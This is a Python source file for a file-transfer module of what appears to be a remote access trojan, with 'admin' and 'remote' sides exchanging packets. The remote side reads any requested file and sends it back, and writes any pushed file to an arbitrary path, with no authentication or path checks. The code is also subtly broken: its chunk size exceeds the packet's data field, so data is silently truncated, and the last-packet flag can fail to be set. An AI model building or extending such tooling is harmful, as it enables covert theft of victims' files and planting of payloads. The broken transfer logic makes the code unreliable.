import os
import struct
from io import BytesIO

from Constants import PACKET_SIZE
from RATFunction.RATFunction import RATFunction


class FileTransfer(RATFunction):

    # packet_id | 1 | directory | is_last | data_size | data
    file_data_packet_struct = struct.Struct(f'I I 100s I I {PACKET_SIZE - 4*4 - 100}s')

    # packet_id | 2 | directory | _
    request_file_packet_struct = struct.Struct(f'I I 100s {PACKET_SIZE - 4*2 - 100}s')

    # packet_id | 3 | message
    message_packet_struct = struct.Struct(f'I I {PACKET_SIZE - 4*2}s')

    def __init__(self, side, packet_queue):
        super().__init__(side, packet_queue)

        # remote vars
        self.remote_file_data_buffers = {}

        # admin vars
        self.admin_file_data_buffers = {}
        self.received_file_callback = lambda file_bytes: ()
        self.message_received_callback = lambda message: ()

    def send_file(self, file_directory, remote_directory):
        with open(file_directory, 'rb') as file:
            self._send_file(file.read(), remote_directory)

    def send_retrieval_request(self, remote_file_path):
        packet = self.request_file_packet_struct.pack(self.identifier(), 2, remote_file_path.encode(), bytes())
        self.packet_queue.put(packet)

    def handle_packet_admin_side(self, data):
        packet_id, packet_subtype, _ = struct.unpack(f'I I {PACKET_SIZE - 4*2}s', data)

        if packet_subtype == 1:
            self.handle_admin_file_data(data)
        elif packet_subtype == 3:
            self.handle_admin_message(data)

    def handle_admin_message(self, data):
        _, _, message = self.message_packet_struct.unpack(data)
        self.message_received_callback(message)

    def handle_admin_file_data(self, data):
        packet_id, packet_subtype, directory, is_last, size, buffer = self.file_data_packet_struct.unpack(data)

        if directory not in self.admin_file_data_buffers:
            self.admin_file_data_buffers[directory] = BytesIO()

        file_buffer = self.admin_file_data_buffers[directory]
        file_buffer.write(buffer[:size])

        if is_last:
            file_bytes = file_buffer.getvalue()
            self.received_file_callback(file_bytes)
            del self.admin_file_data_buffers[directory]

    def handle_packet_remote_side(self, data):
        packet_id, packet_subtype, _ = struct.unpack(f'I I {PACKET_SIZE - 4*2}s', data)

        if packet_subtype == 1:
            self.handle_remote_file_data(data)
        elif packet_subtype == 2:
            self.handle_remote_request(data)

    def handle_remote_file_data(self, data):
        packet_id, packet_subtype, directory, is_last, size, buffer = self.file_data_packet_struct.unpack(data)
        directory = directory.decode().rstrip('\0')

        if directory not in self.remote_file_data_buffers:
            self.remote_file_data_buffers[directory] = BytesIO()

        file_buffer = self.remote_file_data_buffers[directory]
        file_buffer.write(buffer[:size])

        if is_last:
            file_bytes = file_buffer.getvalue()

            try:
                os.makedirs(os.path.dirname(directory))
            except:
                pass

            with open(directory, 'wb') as file:
                file.write(file_bytes)

            packet = self.message_packet_struct.pack(self.identifier(), 3, f'Successfully wrote file to {directory}'.encode())
            self.packet_queue.put(packet)

    def handle_remote_request(self, data):
        packet_id, packet_subtype, directory, _ = self.request_file_packet_struct.unpack(data)
        directory = directory.decode().rstrip('\0')

        try:
            with open(directory, 'rb') as file:
                file_bytes = file.read()
        except FileNotFoundError:
            packet = self.message_packet_struct.pack(self.identifier(), 3, b'ERROR: This file does not exist!')
            self.packet_queue.put(packet)
            return

        self._send_file(file_bytes, directory)

    def _send_file(self, file_bytes, directory):
        offset = 0
        max_chunk_size = PACKET_SIZE - 12
        while offset < len(file_bytes):
            chunk = file_bytes[offset:offset + max_chunk_size]
            is_last = 1 if len(chunk) < max_chunk_size else 0

            packet = self.file_data_packet_struct.pack(self.identifier(), 1, directory.encode(), is_last, len(chunk), chunk)
            self.packet_queue.put(packet)

            offset += len(chunk)

    def identifier(self) -> int:
        return 5
